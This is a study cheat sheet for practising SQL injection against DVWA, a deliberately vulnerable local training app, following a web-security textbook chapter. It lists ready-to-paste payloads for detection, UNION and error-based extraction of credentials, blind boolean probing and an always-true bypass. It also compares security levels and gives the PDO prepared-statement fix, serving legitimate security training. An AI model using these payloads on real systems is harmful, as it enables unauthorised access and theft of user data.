# SQL Injection Practice -- Quick Reference

**Book Reference:** Chapter 4.4.1 of *Safe Web Application Development* by Tokumaru Hiroshi

---

## DVWA URL Paths

| Module | Path |
|---|---|
| SQL Injection | `http://localhost/vulnerabilities/sqli/` |
| SQL Injection (Blind) | `http://localhost/vulnerabilities/sqli_blind/` |

---

## Copy-Paste Payloads

### Detection

| Payload | Purpose |
|---|---|
| `1'` | Trigger a syntax error to confirm injection point |
| `1' AND '1'='1` | True condition -- should return normal result |
| `1' AND '1'='2` | False condition -- should return empty or different result |
| `1 AND 1=1` | Numeric detection (no quotes) |
| `1 AND 1=2` | Numeric false condition (no quotes) |

### UNION-based Extraction

| Payload | Purpose |
|---|---|
| `1' ORDER BY 1#` | Column count -- increment until error |
| `1' ORDER BY 2#` | Column count -- still works = at least 2 columns |
| `1' ORDER BY 3#` | Column count -- error here = query has 2 columns |
| `1' UNION SELECT 1,2#` | Confirm which columns are displayed |
| `1' UNION SELECT user,password FROM users#` | Extract all usernames and password hashes |
| `1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()#` | List all tables in current database |
| `1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'#` | List all columns in the users table |
| `1' UNION SELECT user,password FROM users WHERE user='admin'#` | Extract admin credentials specifically |

### Error-based Extraction

| Payload | Purpose |
|---|---|
| `1' AND EXTRACTVALUE(0,CONCAT('$',(SELECT database())))#` | Reveal current database name |
| `1' AND EXTRACTVALUE(0,CONCAT('$',(SELECT version())))#` | Reveal MySQL version |
| `1' AND EXTRACTVALUE(0,CONCAT('$',(SELECT user())))#` | Reveal current database user |

### Blind SQL Injection (Boolean-based)

| Payload | Purpose |
|---|---|
| `1' AND 1=1#` | Baseline true condition |
| `1' AND 1=2#` | Baseline false condition |
| `1' AND substring(database(),1,1)='d'#` | Test first char of DB name |
| `1' AND substring(database(),2,1)='v'#` | Test second char of DB name |
| `1' AND (SELECT COUNT(*) FROM users)>0#` | Check if users table exists |
| `1' AND length(database())=4#` | Check length of database name |
| `1' AND ascii(substring(database(),1,1))=100#` | Test first char using ASCII value |

### Authentication Bypass

| Payload | Purpose |
|---|---|
| `1' OR '1'='1` | Always-true condition -- dumps all rows |
| `1' OR '1'='1'#` | Same with comment to remove trailing quote |
| `1 OR 1=1` | Numeric version (for Medium level) |

---

## Security Level Comparison

| Aspect | Low | Medium | High | Impossible |
|---|---|---|---|---|
| Input method | Text field | Dropdown | Popup window | Text field |
| HTTP method | GET | POST | GET (via session) | GET |
| Sanitization | None | `mysql_real_escape_string()` | `mysql_real_escape_string()` | PDO prepared statement |
| Quotes in query | Yes (string) | No (numeric) | Yes (string) + LIMIT 1 | Parameterized |
| Vulnerable | Yes | Yes (numeric) | Yes | No |
| Quote injection works | Yes | No (not needed) | Yes | No |
| Numeric injection works | Yes | Yes | Yes | No |

---

## Useful SQL Commands Reference

### Information Gathering

```sql
-- Current database
SELECT database();

-- MySQL version
SELECT version();

-- Current user
SELECT user();

-- List all databases
SELECT schema_name FROM information_schema.schemata;

-- List tables in current database
SELECT table_name FROM information_schema.tables WHERE table_schema = database();

-- List columns in a specific table
SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users';
```

### UNION SELECT Rules

```sql
-- The UNION query must have the same number of columns as the original query.
-- Use ORDER BY to discover the column count first.
-- Use NULL as placeholder if column types don't match:
UNION SELECT NULL, NULL
```

### ORDER BY for Column Count

```sql
-- Increment until you get an error:
ORDER BY 1   -- works
ORDER BY 2   -- works
ORDER BY 3   -- error => original query has 2 columns
```

### INFORMATION_SCHEMA Queries

```sql
-- Full enumeration workflow:
-- 1. Find tables
SELECT table_name FROM information_schema.tables WHERE table_schema = database();

-- 2. Find columns for a target table
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';

-- 3. Extract data
SELECT user, password FROM users;
```

---

## PDO Prepared Statement Example (Book's Recommended Fix)

From the Impossible level source and the book's Chapter 4.4 recommendation:

```php
// SAFE: Parameterized query using PDO
$data = $db->prepare('SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;');
$data->bindParam(':id', $id, PDO::PARAM_INT, 11);
$data->execute();
```

Why this works:
- The SQL structure is defined first with a placeholder `(:id)`
- The user input is bound separately via `bindParam()`
- The database engine never parses the user input as SQL
- Even if the input contains `' OR 1=1#`, it is treated as a literal string/integer value

### Vulnerable Code for Comparison

```php
// UNSAFE: String concatenation
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

---

## Common Mistakes

1. **Forgetting the comment character** -- Use `#` or `--` (with a trailing space) to comment out the rest of the original query. Without it, trailing quotes or clauses will cause syntax errors.

2. **Using quotes for numeric injection** -- At Medium level, the parameter is numeric. The query looks like `WHERE id = $id` (no quotes). Injecting `1 OR 1=1` works. Injecting `1' OR '1'='1` does not.

3. **Wrong column count in UNION** -- The UNION query must return the same number of columns as the original. Always use `ORDER BY` first to determine the count.

4. **Confusing blind vs. regular** -- On the Blind page, you will never see database contents in the response. You only get "exists" or "MISSING". Adjust your strategy to boolean-based extraction.

5. **Trusting client-side controls** -- Dropdowns and hidden fields are not security measures. Always test with a proxy (ZAP) to modify raw requests.

6. **Relying on escaping alone** -- `mysql_real_escape_string()` does not protect numeric parameters. Use prepared statements for all query parameters regardless of type.

7. **Not checking LIMIT clauses** -- At High level, `LIMIT 1` restricts output. Your injection still works, but you only see one row. Use `LIMIT 1,1` or subqueries to access other rows if needed.
